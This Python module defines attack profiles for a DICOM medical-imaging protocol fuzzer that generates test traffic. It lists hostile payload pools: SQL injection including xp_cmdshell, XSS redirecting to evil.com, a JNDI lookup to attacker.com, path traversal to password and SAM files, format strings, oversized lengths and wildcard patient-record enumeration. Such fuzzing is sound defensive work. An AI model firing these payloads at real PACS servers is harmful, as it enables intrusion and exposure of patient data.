#!/usr/bin/env python3
"""
DICOM Attack Profile Definitions

Defines parameter spaces for each attack type used by the GAN generator
and PCAP builder. Each profile specifies:
- PDU sequences (what order to send DICOM PDUs)
- Field overrides (specific values to inject)
- Variant lists (pools of attack payloads)

Also defines MALFORMATION_MUTATIONS for post-generation packet corruption.
"""

# Standard DICOM UIDs used across profiles
VERIFICATION_SOP = "1.2.840.10008.1.1"
CT_IMAGE_STORAGE = "1.2.840.10008.5.1.4.1.1.2"
MR_IMAGE_STORAGE = "1.2.840.10008.5.1.4.1.1.4"
US_IMAGE_STORAGE = "1.2.840.10008.5.1.4.1.1.6.1"
XRAY_ANGIO_STORAGE = "1.2.840.10008.5.1.4.1.1.12.1"
PATIENT_ROOT_QR_FIND = "1.2.840.10008.5.1.4.1.2.1.1"
STUDY_ROOT_QR_FIND = "1.2.840.10008.5.1.4.1.2.2.1"
IMPLICIT_VR_LE = "1.2.840.10008.1.2"
EXPLICIT_VR_LE = "1.2.840.10008.1.2.1"
DICOM_APP_CONTEXT = "1.2.840.10008.3.1.1.1"

# Common legitimate AE titles for realistic traffic
LEGITIMATE_AE_TITLES = [
    "ANY-SCP", "ORTHANC", "STORESCP", "FINDSCP", "MOVESCP",
    "DCMQRSCP", "PACS", "MODALITY", "WORKSTATION",
]

ATTACK_PROFILES = {
    "abort_injection": {
        "description": "Inject A-ABORT during active data transfers to disrupt sessions",
        "pdu_sequence": ["assoc_rq", "assoc_ac", "pdata", "abort"],
        "field_overrides": {
            "abort_source": [0, 1, 2],       # 0=UL service user, 1=reserved, 2=UL service provider
            "abort_reason": list(range(7)),   # 0-6 per DICOM PS3.8
        },
        "abstract_syntaxes": [VERIFICATION_SOP, CT_IMAGE_STORAGE],
        "transfer_syntaxes": [IMPLICIT_VR_LE],
    },

    "state_confusion": {
        "description": "Send DICOM PDUs in wrong protocol state to test state machine robustness",
        "pdu_sequence_variants": [
            ["pdata", "assoc_rq"],                           # data before association
            ["assoc_rq", "assoc_rq"],                        # duplicate association request
            ["assoc_rq", "assoc_ac", "assoc_rq", "pdata"],  # re-associate mid-session
            ["release_rq", "pdata"],                         # data after release
            ["assoc_rq", "assoc_ac", "release_rp"],          # release response without request
            ["abort", "pdata"],                              # data after abort
        ],
        "abstract_syntaxes": [VERIFICATION_SOP],
        "transfer_syntaxes": [IMPLICIT_VR_LE],
    },

    "ae_manipulation": {
        "description": "Malicious AE titles: overflow, injection, Unicode, format strings",
        "pdu_sequence": ["assoc_rq", "assoc_ac", "pdata", "release_rq", "release_rp"],
        "ae_called_variants": [
            "ATTACKER_SCP",
            "' OR 1=1 --",
            "\" OR \"\"=\"",
            "%s%s%s%s%s",
            "%n%n%n%n",
            "%x%x%x%x",
            "A" * 64,                     # overflow 16-byte field
            "A" * 128,
            "\x00" * 16,                  # null bytes
            "../../../etc",               # path traversal
            "ORTHANC\x00EVIL",            # null-terminated injection
            "<script>alert</script>",     # XSS in web PACS viewers
            "${jndi:ldap://x}",           # Log4Shell-style
            "AAAA\xfe\xff",              # invalid UTF-8
        ],
        "ae_calling_variants": [
            "EVIL_SCU",
            "MODALITY\x00XX",
            "A" * 64,
            "%08x.%08x",
            "\xff\xfe\x00\x01",
        ],
        "swap_ae_titles": True,  # also test swapping called/calling
        "abstract_syntaxes": [VERIFICATION_SOP],
        "transfer_syntaxes": [IMPLICIT_VR_LE],
    },

    "pdu_length_attack": {
        "description": "Invalid PDU length values to trigger buffer overflows or crashes",
        "pdu_sequence": ["assoc_rq", "assoc_ac", "pdata", "release_rq", "release_rp"],
        "pdu_len_variants": [
            0,                   # zero length
            1,                   # impossibly small
            67,                  # minimum valid A-ASSOCIATE-RQ minus one
            10000,               # large but plausible
            65535,               # 16-bit max
            0x00FFFFFF,          # 24-bit max
            0xFFFFFFFF,          # 32-bit max (4GB)
            0x7FFFFFFF,          # signed 32-bit max
            0x80000000,          # signed overflow
        ],
        "abstract_syntaxes": [VERIFICATION_SOP],
        "transfer_syntaxes": [IMPLICIT_VR_LE],
    },

    "cve_payloads": {
        "description": "CVE-inspired exploit strings in DICOM UID and syntax fields",
        "pdu_sequence": ["assoc_rq", "assoc_ac", "pdata", "release_rq", "release_rp"],
        "abstract_syntax_variants": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%n%n%n%n",
            "A" * 256,
            "1.2.3.4.5." + "9" * 200,          # extremely long UID
            "1.2.840.10008.1.1\x00INJECTED",   # null byte injection in UID
            "${7*7}",                            # template injection
            "{{7*7}}",                           # Jinja2 template injection
        ],
        "app_context_variants": [
            "%08x." * 20,
            "AAAA" + "%n" * 16,
            DICOM_APP_CONTEXT + "\x00" + "A" * 100,
        ],
        "transfer_syntax_variants": [
            "A" * 128,
            IMPLICIT_VR_LE + "\x00\x00\x00",
            "1.2.3",  # invalid/unknown transfer syntax
        ],
        "abstract_syntaxes": [VERIFICATION_SOP],
        "transfer_syntaxes": [IMPLICIT_VR_LE],
    },

    "association_flood": {
        "description": "Rapid association requests without completing handshake",
        "num_associations": [10, 50, 100, 500],
        "pdu_sequence": ["assoc_rq"],  # single request, no response expected
        "abstract_syntaxes": [VERIFICATION_SOP, CT_IMAGE_STORAGE, MR_IMAGE_STORAGE],
        "transfer_syntaxes": [IMPLICIT_VR_LE, EXPLICIT_VR_LE],
        "max_pdu_len_variants": [16384, 32768, 65536, 0],
    },

    "patient_enum": {
        "description": "C-FIND wildcard enumeration to extract patient data",
        "pdu_sequence": ["assoc_rq", "assoc_ac", "cfind_rq", "release_rq", "release_rp"],
        "patient_name_variants": [
            "*",           # match all
            "A*",
            "?*",
            "*SMITH*",
            "*DOE*",
            "A?B*",
            "[A-Z]*",
            "",            # empty string
            "*" * 100,     # many wildcards
        ],
        "patient_id_variants": [
            "*",
            "000*",
            "???",
        ],
        "abstract_syntaxes": [PATIENT_ROOT_QR_FIND, STUDY_ROOT_QR_FIND],
        "transfer_syntaxes": [IMPLICIT_VR_LE],
    },

    "patient_data_injection": {
        "description": "SQL/XSS/path traversal in patient demographic fields",
        "pdu_sequence": ["assoc_rq", "assoc_ac", "pdata", "release_rq", "release_rp"],
        "patient_name_variants": [
            "' OR 1=1 --",
            "'; DROP TABLE patients; --",
            "\" OR \"\"=\"",
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "${jndi:ldap://attacker.com/exploit}",
            "{{config.__class__.__init__.__globals__}}",
            "A" * 1024,    # long string overflow
            "\x00\x01\x02\x03",  # binary data
        ],
        "patient_id_variants": [
            "' UNION SELECT * FROM users --",
            "1; EXEC xp_cmdshell('cmd')",
            "<script>document.location='http://evil.com'</script>",
        ],
        "abstract_syntaxes": [CT_IMAGE_STORAGE, US_IMAGE_STORAGE],
        "transfer_syntaxes": [IMPLICIT_VR_LE],
    },

    "imaging_manipulation": {
        "description": "Alter DICOM image display parameters (window center/width)",
        "pdu_sequence": ["assoc_rq", "assoc_ac", "pdata", "release_rq", "release_rp"],
        "window_center_variants": [0, -1000, -2048, 4096, 32767, -32768, 65535],
        "window_width_variants": [0, 1, -1, 4096, 65535, -32768],
        "bits_allocated_variants": [0, 1, 4, 8, 16, 32, 64],
        "bits_stored_variants": [0, 1, 4, 8, 12, 16, 24, 32],
        "abstract_syntaxes": [CT_IMAGE_STORAGE, MR_IMAGE_STORAGE, US_IMAGE_STORAGE],
        "transfer_syntaxes": [IMPLICIT_VR_LE, EXPLICIT_VR_LE],
    },
}

# Malformation mutations applied post-generation to create structurally invalid packets
MALFORMATION_MUTATIONS = {
    "truncate_mid_pdu": {
        "description": "Truncate packet payload in the middle of a PDU",
        "apply_to": ["pdata", "assoc_rq", "assoc_ac"],
        "truncate_ratios": [0.25, 0.5, 0.75],  # fraction of PDU to keep
    },
    "reserved_bytes_nonzero": {
        "description": "Set reserved/padding bytes to non-zero values",
        "byte_values": [0xFF, 0xAA, 0x55, 0x01, 0x80],
        "apply_to": ["assoc_rq", "assoc_ac", "release_rq", "release_rp", "abort"],
    },
    "random_byte_insertion": {
        "description": "Insert random bytes into the DICOM byte stream",
        "insertion_sizes": [1, 4, 16, 64, 256],
        "apply_to": ["pdata", "assoc_rq"],
    },
    "pdu_reorder": {
        "description": "Swap ordering of PDUs within a TCP session",
        "strategies": ["reverse", "shuffle", "duplicate_first", "duplicate_last"],
    },
    "length_mismatch": {
        "description": "Set PDU length field to differ from actual data length",
        "strategies": ["shorter_by_10", "longer_by_100", "zero", "max_uint32"],
    },
    "pdu_type_invalid": {
        "description": "Set PDU type byte to undefined values",
        "invalid_types": [0x00, 0x08, 0x09, 0x0A, 0x10, 0x20, 0x80, 0xFF],
    },
    "item_type_invalid": {
        "description": "Set association item type bytes to invalid values",
        "invalid_item_types": [0x00, 0x01, 0x60, 0x80, 0xFF],
        "apply_to": ["assoc_rq", "assoc_ac"],
    },
}

# Mapping of PDU type codes to names (per DICOM PS3.8 Table 9-1)
PDU_TYPE_MAP = {
    "assoc_rq":   0x01,  # A-ASSOCIATE-RQ
    "assoc_ac":   0x02,  # A-ASSOCIATE-AC
    "assoc_rj":   0x03,  # A-ASSOCIATE-RJ
    "pdata":      0x04,  # P-DATA-TF
    "release_rq": 0x05,  # A-RELEASE-RQ
    "release_rp": 0x06,  # A-RELEASE-RP
    "abort":      0x07,  # A-ABORT
}

# Reverse mapping
PDU_NAME_MAP = {v: k for k, v in PDU_TYPE_MAP.items()}


def get_attack_profile(attack_type):
    """Get an attack profile by name. Returns None if not found."""
    return ATTACK_PROFILES.get(attack_type)


def list_attack_types():
    """Return list of available attack type names."""
    return list(ATTACK_PROFILES.keys())


def get_pdu_sequence(profile):
    """
    Get the PDU sequence for an attack profile.
    For profiles with variants, returns all variant sequences.
    For profiles with a single sequence, returns it in a list.
    """
    if "pdu_sequence_variants" in profile:
        return profile["pdu_sequence_variants"]
    elif "pdu_sequence" in profile:
        return [profile["pdu_sequence"]]
    else:
        # Default DICOM session sequence
        return [["assoc_rq", "assoc_ac", "pdata", "release_rq", "release_rp"]]


def get_malformation_list():
    """Return list of available malformation mutation names."""
    return list(MALFORMATION_MUTATIONS.keys())


# ============================================================================
# Attack Profile → State Sequence Mappings
# ============================================================================
# Maps each attack profile name to corresponding STATE_SEQUENCES entries
# from fuzzer.rl.hybrid_env, so the session planner can reference attack
# profiles by name when choosing PDU sequences.

ATTACK_TO_STATE_SEQUENCES = {
    "abort_injection": [
        "immediate_abort",
        "pdata_abort_pdata",
        "store_abort_store",
    ],
    "state_confusion": [
        "pdata_first",
        "double_assoc",
        "release_before_pdata",
        "pdata_then_assoc",
        "release_first",
        "abort_first",
        "release_then_assoc",
    ],
    "ae_manipulation": [
        "normal",
        "no_release",
        "cstore_normal",
    ],
    "pdu_length_attack": [
        "normal",
        "cstore_normal",
        "assoc_only",
    ],
    "cve_payloads": [
        "normal",
        "cstore_normal",
        "cstore_rich",
        "cfind_normal",
        "cmove_normal",
    ],
    "association_flood": [
        "assoc_only",
        "double_assoc",
        "triple_assoc",
    ],
    "patient_enum": [
        "cfind_normal",
        "cfind_flood",
        "find_then_move",
        "find_then_get",
    ],
    "patient_data_injection": [
        "cstore_normal",
        "cstore_rich",
        "cstore_double",
    ],
    "imaging_manipulation": [
        "cstore_normal",
        "cstore_rich",
        "cstore_mr",
        "cstore_us",
    ],
}


def get_state_sequences_for_attack(attack_type):
    """Get the list of state sequence names for a given attack type."""
    return ATTACK_TO_STATE_SEQUENCES.get(attack_type, ["normal"])
